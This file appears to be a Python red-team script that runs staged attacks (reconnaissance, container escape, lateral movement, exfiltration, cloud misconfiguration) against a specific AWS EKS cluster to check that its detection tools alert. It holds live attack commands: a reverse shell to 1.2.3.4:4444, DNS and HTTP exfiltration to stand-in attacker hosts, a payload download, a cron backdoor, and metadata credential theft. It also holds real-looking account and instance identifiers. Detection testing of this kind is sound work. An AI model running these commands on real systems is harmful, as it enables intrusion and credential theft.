#!/usr/bin/env python3
"""
UATMS Red Team Demo — Automated Attack Orchestrator
Runs systematic attack scenarios against the live cluster and verifies real-time detection.

Usage:
    python3 demo_attack.py [--phases all|recon|execution|lateral|exfil|cloud]
                           [--speed slow|normal|fast]
                           [--dry-run]
                           [--no-verify]
"""

import argparse
import subprocess
import sys
import time
import json
from datetime import datetime, timezone

RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
BLUE   = "\033[94m"
CYAN   = "\033[96m"
WHITE  = "\033[97m"
BOLD   = "\033[1m"
DIM    = "\033[2m"
RESET  = "\033[0m"

EKS_ENDPOINT  = "https://F5B2A199C8FE9E5CF2618FF57B46E081.gr7.eu-central-1.eks.amazonaws.com"
ATTACKER_POD  = "attacker"
ATTACKER_NS   = "default"
TARGET_IP     = "10.30.11.9"
WAZUH_IP      = "10.0.10.29"
MISP_IP       = "10.0.10.85"

FALCO_POD     = "falco-zwxxp"
TETRAGON_POD  = "tetragon-6hbls"
ZEEK_POD      = "zeek-nqdqx"

SPEEDS = {"slow": 20, "normal": 10, "fast": 4}


def ts():
    return datetime.now(timezone.utc).strftime("%H:%M:%S")


def banner():
    print(RED + BOLD + r"""
 ██╗   ██╗ █████╗ ████████╗███╗   ███╗███████╗    ██████╗ ███████╗██████╗
 ██║   ██║██╔══██╗╚══██╔══╝████╗ ████║██╔════╝    ██╔══██╗██╔════╝██╔══██╗
 ██║   ██║███████║   ██║   ██╔████╔██║███████╗    ██████╔╝█████╗  ██║  ██║
 ██║   ██║██╔══██║   ██║   ██║╚██╔╝██║╚════██║    ██╔══██╗██╔══╝  ██║  ██║
 ╚██████╔╝██║  ██║   ██║   ██║ ╚═╝ ██║███████║    ██║  ██║███████╗██████╔╝
  ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚═╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═════╝
""" + RESET + YELLOW + """
  Ultra Advanced Threat Monitoring System — Automated Red Team Demo
  Target: bc-uatms-prd-eks  |  Account: 929026881368  |  Region: eu-west-1
""" + RESET)


def section_header(title, color=YELLOW):
    w = 72
    print("\n" + color + BOLD + "━" * w)
    print("  " + title)
    print("━" * w + RESET + "\n")


def attack_card(num, total, name, mitre, description, watch):
    print(RED + BOLD + "┌─ ATTACK {}/{} ──────────────────────────────────────────────────┐".format(num, total) + RESET)
    print(RED + BOLD + "│" + RESET + "  " + WHITE + BOLD + name + RESET)
    print(RED + BOLD + "│" + RESET + "  " + CYAN + "MITRE: " + mitre + RESET)
    print(RED + BOLD + "│" + RESET + "  " + DIM + description + RESET)
    print(RED + BOLD + "│" + RESET + "  " + GREEN + "► Watch: " + watch + RESET)
    print(RED + BOLD + "└────────────────────────────────────────────────────────────────┘" + RESET)


def run(args, timeout=15):
    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=timeout)
        return r.returncode, r.stdout.strip(), r.stderr.strip()
    except subprocess.TimeoutExpired:
        return -1, "", "TIMEOUT"
    except Exception as e:
        return -1, "", str(e)


def kexec(cmd, pod=ATTACKER_POD, ns=ATTACKER_NS, timeout=12):
    return run(["kubectl", "exec", "-n", ns, pod, "--"] + cmd, timeout=timeout)


def show_result(rc, stdout, stderr, expect_blocked=False):
    out = (stdout or stderr or "").split("\n")[0][:120]
    if rc == 137:
        print(GREEN + BOLD + "  [SIGKILL ✓]  exit 137 — Tetragon eBPF killed the process" + RESET)
    elif rc == 0 and not expect_blocked:
        print(YELLOW + "  [EXECUTED]  exit 0 — command ran" + RESET)
    elif rc == 0 and expect_blocked:
        print(RED + BOLD + "  [BYPASS ✗]  exit 0 — NOT blocked!" + RESET)
    elif rc == -1:
        print(GREEN + "  [TIMEOUT ✓]  connection dropped / no route (Cilium)" + RESET)
    else:
        print(GREEN + "  [BLOCKED ✓]  exit {} — refused / dropped".format(rc) + RESET)
    if out:
        print(DIM + "  ↳ " + out + RESET)


def countdown(seconds, msg="Waiting for dashboard propagation"):
    sys.stdout.write("\n  " + YELLOW + "⏳ " + msg + "  ")
    for i in range(seconds, 0, -1):
        sys.stdout.write("{} ".format(i))
        sys.stdout.flush()
        time.sleep(1)
    sys.stdout.write("→ check dashboards now" + RESET + "\n\n")


def verify_tetragon(since="30s"):
    rc, out, _ = run(["kubectl", "-n", "kube-system", "logs", TETRAGON_POD,
                       "--since=" + since], timeout=10)
    kills = []
    for line in out.split("\n"):
        if "KPROBE_ACTION_SIGKILL" not in line:
            continue
        try:
            d = json.loads(line)
            kp = d.get("process_kprobe", {})
            if kp.get("action") == "KPROBE_ACTION_SIGKILL":
                binary = kp.get("process", {}).get("binary", "?")
                kills.append("{} (policy={})".format(binary, kp.get("policy_name", "?")))
        except Exception:
            kills.append("(raw kill event)")
    return kills


def verify_falco(since="30s", keywords=None):
    keywords = keywords or []
    rc, out, _ = run(["kubectl", "-n", "falco", "logs", FALCO_POD,
                       "-c", "falco", "--since=" + since], timeout=10)
    hits = []
    for line in out.split("\n"):
        try:
            d = json.loads(line)
            rule     = d.get("rule", "")
            priority = d.get("priority", "")
            ns       = d.get("output_fields", {}).get("k8s.ns.name", "")
            if priority in ("Critical", "Warning", "Error"):
                if not keywords or any(k.lower() in (rule + ns).lower() for k in keywords):
                    hits.append("[{}] {} (ns={})".format(priority, rule, ns))
        except Exception:
            pass
    return hits


def verify_zeek(src_ip="10.30.11.131", since_lines=50):
    rc, out, _ = run([
        "kubectl", "exec", "-n", "zeek", ZEEK_POD, "-c", "zeek", "--",
        "bash", "-c",
        "tail -{} /var/log/zeek/conn.log 2>/dev/null | grep {} | tail -5".format(since_lines, src_ip)
    ], timeout=10)
    conns = []
    for line in out.split("\n"):
        if not line.strip():
            continue
        try:
            d = json.loads(line)
            conns.append("{}:{} → {}:{} state={}".format(
                d.get("id.orig_h"), d.get("id.orig_p"),
                d.get("id.resp_h"), d.get("id.resp_p"),
                d.get("conn_state")))
        except Exception:
            pass
    return conns


def print_detections(tetragon=None, falco=None, zeek=None):
    has_any = False
    if tetragon:
        has_any = True
        print(RED + BOLD + "  TETRAGON EVENTS:" + RESET)
        for e in tetragon[:3]:
            print(RED + "    ✦ SIGKILL: " + e + RESET)
    if falco:
        has_any = True
        print(YELLOW + BOLD + "  FALCO ALERTS:" + RESET)
        for e in falco[:4]:
            print(YELLOW + "    ✦ " + e + RESET)
    if zeek:
        has_any = True
        print(CYAN + BOLD + "  ZEEK CONNECTIONS:" + RESET)
        for e in zeek[:4]:
            print(CYAN + "    ✦ " + e + RESET)
    if not has_any:
        print(DIM + "  (no events captured in window — check Wazuh dashboard)" + RESET)


# ─────────────────────────────────────────────────────────────────────────────
# Attack phases
# ─────────────────────────────────────────────────────────────────────────────

def phase_recon(delay, dry_run, verify):
    section_header("PHASE 1 — RECONNAISSANCE  [T1595, T1046, T1082]", color=BLUE)

    attack_card(1, 3, "EKS Public API Endpoint Probe",
                "T1595.002 — Active Scanning",
                "Unauthenticated probe of public K8s endpoint. /healthz leaks cluster liveness from the internet.",
                "GuardDuty | CloudTrail (no Wazuh alert unless auth attempted)")
    print(DIM + "  $ curl -sk {}/healthz".format(EKS_ENDPOINT) + RESET)
    if not dry_run:
        rc, out, err = run(["curl", "-sk", "--max-time", "5", EKS_ENDPOINT + "/healthz"])
        show_result(rc, out, err, expect_blocked=False)
        for path in ["/version", "/apis"]:
            rc2, out2, _ = run(["curl", "-sk", "--max-time", "4", EKS_ENDPOINT + path])
            print(DIM + "  {} → {}".format(path, (out2 or "401/no response")[:80]) + RESET)
    if not dry_run:
        countdown(delay, "EKS probe sent — check GuardDuty")

    attack_card(2, 3, "K8s API Abuse via Pod Service Account Token",
                "T1613 — Container & Resource Discovery",
                "Pod's auto-mounted SA token used to enumerate cluster. default SA has minimal RBAC here.",
                "Wazuh → Kubernetes audit | K8s API server audit logs")
    print(DIM + "  $ kubectl exec attacker -- curl K8s API with Bearer SA token" + RESET)
    if not dry_run:
        cmd = [
            "bash", "-c",
            "TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); "
            "curl -sk -H \"Authorization: Bearer $TOKEN\" "
            "https://kubernetes.default.svc/api/v1/namespaces 2>&1 | "
            "python3 -c \"import json,sys; d=json.load(sys.stdin); "
            "print('ALLOWED: '+str(len(d.get('items',[]))) if 'items' in d else 'FORBIDDEN: '+d.get('reason','?'))\""
        ]
        rc, out, err = kexec(cmd, timeout=12)
        show_result(rc, out, err, expect_blocked=False)
    if not dry_run:
        countdown(delay, "API probe sent")

    attack_card(3, 3, "DNS Cluster Mapping — Internal Service Discovery",
                "T1046 — Network Service Discovery",
                "Resolve internal K8s service FQDNs to map the cluster topology. Zeek logs every query.",
                "Wazuh → Zeek dns.log decoder")
    print(DIM + "  $ getent hosts *.svc.cluster.local  (wazuh, suricata, nomad-oasis...)" + RESET)
    if not dry_run:
        services = [
            "wazuh.wazuh.svc.cluster.local",
            "suricata.suricata.svc.cluster.local",
            "nomad-oasis.nomad-oasis.svc.cluster.local",
            "kubernetes.default.svc.cluster.local",
        ]
        cmd = ["bash", "-c",
               "for s in {}; do getent hosts $s 2>/dev/null && echo RESOLVED:$s || echo NX:$s; done".format(
                   " ".join(services))]
        rc, out, err = kexec(cmd, timeout=15)
        for line in (out or "").split("\n")[:6]:
            print(DIM + "    " + line + RESET)
    if not dry_run:
        countdown(delay, "DNS enumeration done — check Zeek dns.log")
        if verify:
            zeek = verify_zeek(since_lines=100)
            print_detections(zeek=zeek)


def phase_execution(delay, dry_run, verify):
    section_header("PHASE 2 — EXECUTION  [T1059, T1203, T1611]", color=RED)

    attack_card(1, 3, "nmap — Tetragon eBPF SIGKILL",
                "T1046 — Network Service Discovery",
                "nmap in Tetragon TracingPolicy blocklist. execve kprobe fires before first packet. "
                "Process killed at kernel level — never runs.",
                "Tetragon export-stdout: KPROBE_ACTION_SIGKILL | policy=sigkill-malicious-tools")
    print(DIM + "  $ kubectl exec attacker -- nmap -sS -p 1-1024 {}".format(TARGET_IP) + RESET)
    if not dry_run:
        rc, out, err = kexec(["nmap", "-sS", "-p", "1-1024", TARGET_IP], timeout=8)
        show_result(rc, out, err, expect_blocked=True)
    if not dry_run:
        countdown(delay, "nmap fired — check Tetragon export-stdout")
        if verify:
            kills = verify_tetragon(since="35s")
            print_detections(tetragon=kills)

    attack_card(2, 3, "Container Shell Spawn — Falco Detection",
                "T1059.004 — Unix Shell",
                "PTY allocated inside running container triggers Falco 'Terminal shell in container'. "
                "Also triggers 'Drop and execute new binary' if tool is installed at runtime.",
                "Falco live: [Warning] Terminal shell in container | Wazuh → falco-json decoder")
    print(DIM + "  $ kubectl exec attacker -- script -q -c 'id && whoami' /dev/null  (PTY spawn)" + RESET)
    if not dry_run:
        rc, out, err = kexec([
            "bash", "-c",
            "script -q -c 'id && whoami && cat /etc/shadow 2>/dev/null || echo no_shadow' /dev/null 2>&1 || true; "
            "echo SHELL_DONE"
        ], timeout=10)
        show_result(rc, out, err, expect_blocked=False)
    if not dry_run:
        countdown(delay, "Shell spawned — check Falco logs")
        if verify:
            falco = verify_falco(since="35s", keywords=["shell", "attacker", "default", "binary"])
            print_detections(falco=falco)

    attack_card(3, 3, "Host Escape Attempt — Write to Sensitive Paths",
                "T1611 — Escape to Host",
                "Attacker tries /proc/sysrq-trigger, /etc/cron.d backdoor, and binary download+execute. "
                "Falco watches write_below_root and package_mgmt_spawned.",
                "Falco live: [Critical] Write below root | Wazuh → falco-json decoder")
    print(DIM + "  $ echo b > /proc/sysrq-trigger && curl malware | bash" + RESET)
    if not dry_run:
        cmds = (
            "echo b > /proc/sysrq-trigger 2>&1 || echo SYSRQ_BLOCKED; "
            "echo '* * * * * root /tmp/bd.sh' > /etc/cron.d/backdoor 2>&1 && echo CRON_WRITTEN || echo CRON_BLOCKED; "
            "curl -so /tmp/malware http://evil.example.com/payload --max-time 2 2>&1; "
            "chmod +x /tmp/malware 2>/dev/null; echo ESCAPE_DONE"
        )
        rc, out, err = kexec(["bash", "-c", cmds], timeout=12)
        for line in (out or "").split("\n")[:4]:
            print(DIM + "    " + line + RESET)
    if not dry_run:
        countdown(delay, "Escape attempts done — check Falco")
        if verify:
            falco = verify_falco(since="35s")
            print_detections(falco=falco)


def phase_lateral(delay, dry_run, verify):
    section_header("PHASE 3 — LATERAL MOVEMENT  [T1021, T1563, T1552]", color=YELLOW)

    attack_card(1, 3, "Cross-Namespace & Cross-VPC Pivot",
                "T1021 — Remote Services",
                "Attacker probes 5 targets across namespaces and VPC boundary. "
                "Cilium CNPs block all. Zeek logs every SYN as conn_state=S0.",
                "Zeek conn.log: S0 state for all targets | Hubble UI: red denied flows")
    targets = [
        ("Suricata pod",      "10.30.11.195", 9200),
        ("Nomad MongoDB",     "10.30.11.15",  27017),
        ("Wazuh TCP 1514",    WAZUH_IP,       1514),
        ("MISP TCP 443",      MISP_IP,        443),
        ("GitHub runner 22",  "10.0.0.120",   22),
    ]
    if not dry_run:
        for label, ip, port in targets:
            cmd = ["bash", "-c",
                   "timeout 2 bash -c 'echo > /dev/tcp/{}/{}'".format(ip, port) +
                   " 2>/dev/null && echo OPEN || echo BLOCKED"]
            rc, out, _ = kexec(cmd, timeout=5)
            color = GREEN if "BLOCKED" in out else RED + BOLD
            print(color + "  {:28s} {}:{} → {}".format(label, ip, port, out) + RESET)
    if not dry_run:
        countdown(delay, "Lateral probes sent — check Zeek conn.log + Hubble")
        if verify:
            zeek = verify_zeek(since_lines=200)
            print_detections(zeek=zeek[:5])

    attack_card(2, 3, "EC2 IMDS Credential Theft",
                "T1552.005 — Cloud Instance Metadata API",
                "169.254.169.254 hit to steal node IAM role. Cilium blocks the route. "
                "Zeek logs 4 connection attempts (S0). GuardDuty flags if EKS metadata protection enabled.",
                "Zeek conn.log: 169.254.169.254 state=S0 | GuardDuty: CredentialAccess/IMDS")
    print(DIM + "  $ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/" + RESET)
    if not dry_run:
        cmds = (
            "curl -s --max-time 2 http://169.254.169.254/latest/meta-data/ && echo GOT_IMDS || echo IMDS_BLOCKED; "
            "TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token "
            "-H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' --max-time 2 2>&1); "
            "echo IMDSv2_token:${TOKEN:0:20}"
        )
        rc, out, err = kexec(["bash", "-c", cmds], timeout=12)
        show_result(rc, out, err, expect_blocked=True)
    if not dry_run:
        countdown(delay, "IMDS probe sent — check Zeek + GuardDuty")

    attack_card(3, 3, "Rapid Port Scan — Suricata SID 9000008",
                "T1046 — Network Service Discovery",
                "30 SYNs to different ports on target in <5s. "
                "Triggers Suricata rule: 20+ SYNs in 5s from same source.",
                "Suricata eve.json alert | Wazuh → Suricata decoder | SID 9000008")
    print(DIM + "  $ for p in 1..30; do curl {}:$p & done".format(TARGET_IP) + RESET)
    if not dry_run:
        cmd = ["bash", "-c",
               "for p in $(seq 1 30); do "
               "curl -s --max-time 0.1 http://{}:$p &>/dev/null & done; wait; echo SCAN_DONE".format(TARGET_IP)]
        rc, out, err = kexec(cmd, timeout=15)
        show_result(rc, out, err, expect_blocked=False)
    if not dry_run:
        countdown(delay, "Port scan done — check Suricata eve.json + Wazuh")


def phase_exfil(delay, dry_run, verify):
    section_header("PHASE 4 — EXFILTRATION  [T1048, T1041]", color=CYAN)

    attack_card(1, 2, "DNS Exfiltration — Subdomain Data Encoding",
                "T1048.003 — Exfiltration Over DNS",
                "Stolen data base64-encoded and sent as DNS subdomain queries. "
                "Zeek dns.log logs every query. Pattern: <chunk>.exfil.evil-c2.xyz",
                "Zeek dns.log: unusual external subdomains | Wazuh Zeek decoder")
    print(DIM + "  $ for chunk in $(echo SECRET|base64|fold -w20); do dig $chunk.exfil.evil-c2.xyz; done" + RESET)
    if not dry_run:
        cmds = (
            "SECRET='WAZUH_API_KEY_STOLEN_VIA_EXFIL'; "
            "B64=$(echo $SECRET | base64); "
            "echo Exfil_payload:$B64; "
            "for chunk in $(echo $B64 | fold -w 20); do "
            "  getent hosts ${chunk}.exfil.evil-c2.xyz 2>/dev/null || true; "
            "done; echo DNS_EXFIL_DONE"
        )
        rc, out, err = kexec(["bash", "-c", cmds], timeout=15)
        for line in (out or "").split("\n")[:4]:
            print(DIM + "    " + line + RESET)
    if not dry_run:
        countdown(delay, "DNS exfil done — check Zeek dns.log in Wazuh")

    attack_card(2, 2, "C2 Callback — Reverse Shell Exfiltration",
                "T1041 — Exfiltration Over C2 Channel",
                "Attacker tries bash /dev/tcp reverse shell to C2 and HTTP POST exfil. "
                "Cilium blocks external egress. Zeek logs the connection attempts.",
                "Zeek conn.log: external IP state=S0 | Hubble: red flow to internet")
    print(DIM + "  $ bash -c 'echo DATA > /dev/tcp/1.2.3.4/4444'  (reverse shell)" + RESET)
    if not dry_run:
        cmds = (
            "timeout 2 bash -c 'echo EXFIL_DATA > /dev/tcp/1.2.3.4/4444' 2>&1 || echo C2_BLOCKED; "
            "curl -s --max-time 2 -X POST http://evil-c2.example.com/collect "
            "-d 'stolen=AWS_KEYS_HERE' 2>&1 || echo HTTP_EXFIL_BLOCKED; "
            "echo EXFIL_DONE"
        )
        rc, out, err = kexec(["bash", "-c", cmds], timeout=12)
        show_result(rc, out, err, expect_blocked=True)
    if not dry_run:
        countdown(delay, "C2 attempts sent — check Zeek + Hubble + Cilium drops")
        if verify:
            zeek = verify_zeek(since_lines=300)
            print_detections(zeek=zeek[:4])


def phase_cloud(delay, dry_run, verify):
    section_header("PHASE 5 — CLOUD ATTACKS  [T1078, T1562, T1136]", color=YELLOW)

    attack_card(1, 3, "Security Group Backdoor (Wazuh rule 100302)",
                "T1562.007 — Disable or Modify Cloud Firewall",
                "Open port 31337 in a security group. CloudTrail logs the API call. "
                "Wazuh S3-wodle ingests CloudTrail and fires rule 100302 (level 8).",
                "Wazuh Dashboard → AWS CloudTrail module → Security Group rule")
    print(DIM + "  $ aws ec2 authorize-security-group-ingress --port 31337 --cidr 0.0.0.0/0" + RESET)
    if not dry_run:
        rc, out, err = run([
            "aws", "ec2", "authorize-security-group-ingress",
            "--group-id", "sg-05910c06c787ead2a",
            "--protocol", "tcp", "--port", "31337", "--cidr", "0.0.0.0/0",
            "--region", "eu-west-1"
        ], timeout=15)
        show_result(rc, out, err, expect_blocked=False)
        run([
            "aws", "ec2", "revoke-security-group-ingress",
            "--group-id", "sg-05910c06c787ead2a",
            "--protocol", "tcp", "--port", "31337", "--cidr", "0.0.0.0/0",
            "--region", "eu-west-1"
        ], timeout=10)
        print(DIM + "  (revoked immediately)" + RESET)
    if not dry_run:
        countdown(delay, "CloudTrail event written — check Wazuh AWS module (~5min lag)")

    attack_card(2, 3, "IAM Privilege Discovery (Wazuh rule 100303)",
                "T1069.003 — Permission Groups Discovery: Cloud",
                "Enumerate IAM roles and policies to find escalation paths. "
                "CRITICAL: github-runner-role has AdministratorAccess on this account.",
                "Wazuh → AWS CloudTrail module | GuardDuty: UnauthorizedAccess")
    print(DIM + "  $ aws iam list-roles && aws iam list-attached-role-policies --role-name github-runner-role" + RESET)
    if not dry_run:
        rc, out, _ = run(["aws", "iam", "list-attached-role-policies",
                           "--role-name", "github-runner-role", "--output", "json"], timeout=15)
        try:
            d = json.loads(out)
            for p in d.get("AttachedPolicies", []):
                color = RED + BOLD if "Admin" in p["PolicyName"] else DIM
                print(color + "  POLICY: {} → {}".format(p["PolicyName"], p["PolicyArn"]) + RESET)
        except Exception:
            print(DIM + "  " + out[:200] + RESET)
        print(RED + BOLD + "  ► CRITICAL: github-runner-role has AdministratorAccess!" + RESET)
        print(RED + "  ► Any CI pipeline compromise = full AWS account takeover" + RESET)
    if not dry_run:
        countdown(delay, "IAM enumeration done — check CloudTrail")

    attack_card(3, 3, "EKS Public API — Internet Reachability",
                "T1592 — Gather Victim Host Information",
                "EKS endpoint is reachable from 0.0.0.0/0 (no CIDR restriction). "
                "Attacker confirms cluster is live + healthy without credentials.",
                "GuardDuty: Discovery/Kubernetes | restrict publicAccessCidrs to fix")
    print(DIM + "  $ curl {}/livez  # no auth required — internet accessible".format(EKS_ENDPOINT) + RESET)
    if not dry_run:
        for path in ["/livez", "/readyz", "/healthz"]:
            rc, out, _ = run(["curl", "-sk", "--max-time", "4", EKS_ENDPOINT + path])
            color = YELLOW if out == "ok" else GREEN
            print(color + "  {} → {}".format(path, out or "no response") + RESET)
        print(RED + "  ► EKS health endpoints confirm cluster existence to unauthenticated internet" + RESET)
    if not dry_run:
        countdown(delay, "EKS probes done — check GuardDuty")


# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="UATMS Red Team Demo")
    parser.add_argument("--phases", default="all",
                        help="Comma-separated phases: all, recon, execution, lateral, exfil, cloud")
    parser.add_argument("--speed", choices=["slow", "normal", "fast"], default="normal")
    parser.add_argument("--dry-run", action="store_true")
    parser.add_argument("--no-verify", action="store_true")
    args = parser.parse_args()

    delay  = SPEEDS[args.speed]
    verify = not args.no_verify
    dry_run = args.dry_run

    banner()

    if dry_run:
        print(YELLOW + BOLD + "  DRY RUN — commands printed, not executed\n" + RESET)

    print("  Speed:   {} ({}s between attacks)".format(args.speed, delay))
    print("  Phases:  " + args.phases)
    print("  Verify:  " + str(verify))
    print("\n" + GREEN + "  Dashboard access:" + RESET)
    print(DIM + "  Wazuh:    aws ssm start-session --target i-0f5b346b3a4f626a6 --region eu-west-1 \\")
    print("            --document-name AWS-StartPortForwardingSession \\")
    print("            --parameters '{\"portNumber\":[\"443\"],\"localPortNumber\":[\"8443\"]}'")
    print("  MISP:     aws ssm start-session --target i-0a32ffa7d8ba62be9 --region eu-west-1 \\")
    print("            --document-name AWS-StartPortForwardingSession \\")
    print("            --parameters '{\"portNumber\":[\"443\"],\"localPortNumber\":[\"8444\"]}'")
    print("  Hubble:   kubectl -n kube-system port-forward svc/hubble-ui 12000:80")
    print("  Falco:    kubectl -n falco logs -l app.kubernetes.io/name=falco -c falco -f")
    print("  Tetragon: kubectl -n kube-system logs ds/tetragon -c export-stdout -f" + RESET)

    print("\n" + BOLD + "  Starting in 5 seconds..." + RESET)
    if not dry_run:
        for i in range(5, 0, -1):
            sys.stdout.write("\r  " + YELLOW + "{}...".format(i) + RESET + "  ")
            sys.stdout.flush()
            time.sleep(1)
    print("\n")

    phases  = [p.strip() for p in args.phases.split(",")]
    run_all = "all" in phases
    start   = datetime.now(timezone.utc)

    if run_all or "recon"     in phases: phase_recon(delay, dry_run, verify)
    if run_all or "execution" in phases: phase_execution(delay, dry_run, verify)
    if run_all or "lateral"   in phases: phase_lateral(delay, dry_run, verify)
    if run_all or "exfil"     in phases: phase_exfil(delay, dry_run, verify)
    if run_all or "cloud"     in phases: phase_cloud(delay, dry_run, verify)

    elapsed = (datetime.now(timezone.utc) - start).seconds
    section_header("RUN COMPLETE — {}s elapsed".format(elapsed), color=GREEN)
    print(GREEN + BOLD + "  All attack phases finished." + RESET)
    print(WHITE + "  → Wazuh Dashboard: aggregated SIEM alerts + MITRE ATT&CK view" + RESET)
    print(WHITE + "  → Hubble UI:       flow drop visualization (if relay is healthy)" + RESET)
    print(WHITE + "  → GuardDuty:       cloud-layer findings (may have 2-5min delay)" + RESET)
    print(WHITE + "  → Falco live:      container runtime detections already showed inline" + RESET)
    print(WHITE + "  → Tetragon live:   SIGKILL events already showed inline\n" + RESET)


if __name__ == "__main__":
    main()
